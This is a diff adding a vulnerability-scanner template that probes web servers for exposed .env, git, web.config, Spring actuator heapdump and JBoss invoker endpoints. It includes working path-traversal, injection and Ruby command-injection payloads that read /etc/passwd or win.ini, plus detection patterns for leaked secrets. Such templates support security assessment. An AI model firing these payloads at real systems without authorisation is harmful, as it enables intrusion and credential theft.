@@ -1,0 +1,59 @@
+id: commons-recon-collections
+info:
+  name: Commons Collections
+  risk: INFO
+params:
+  # - dest: "{{.oob}}"
+variables:
+  - path: |
+      .env
+      .git/config
+      .svn/entries
+      web.config
+      web.config.txt
+      env
+      xyz/..;/env
+      heapdump
+      xyz/..;/heapdump
+      actuator/env
+      actuator/heapdump
+      xyz/..;/actuator/env
+      xyz/..;/actuator/heapdump
+      josso/%5C../invoker/EJBInvokerServlet/
+      josso/%5C../invoker/JMXInvokerServlet/
+      invoker/JMXInvokerServlet/
+      invoker/EJBInvokerServlet
+      OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+      XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
+      menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo
+      ?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+requests:
+  - method: GET
+    redirect: true
+    url: >-
+     {{.BaseURL}}/{{.path}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+      - Content-Type: application/x-www-form-urlencoded
+      - Referer: '{{.BaseURL}}'
+      - X-Forwarded-For: 127.0.0.1
+    # body:
+    detections:
+      - >-
+        RegexSearch("response", "(?m)^APP_(NAME|ENV|KEY|DEBUG|URL)=") && StatusCode() == 200 
+      - >-
+        StringSearch("response", "<configuration>") && StatusCode() == 200 && StringSearch("response", "<system.webServer>")
+      - >-
+        StringSearch("response", "svn://") && StatusCode() == 200
+      - >-
+        StringSearch("response", "refs/heads") && StatusCode() == 200
+      - >-
+        StringSearch("response", "org.springframework") && StatusCode() == 200
+      - >-
+        StringSearch("response", "org.jboss.invocation.MarshalledValue") && StatusCode() == 200        
+      - >-
+        StringSearch("response", "root:x:0") && StatusCode() == 200 
+      - >-
+        StringSearch("response", "bit app support") && StatusCode() == 200 && StringSearch("response", "extensions")
+      - >-
+        StringSearch("response", "<jnlp codebase=\"nonexistent.1337\">") && StatusCode() == 200 && StringSearch("resHeaders", "application/x-java-jnlp-file")
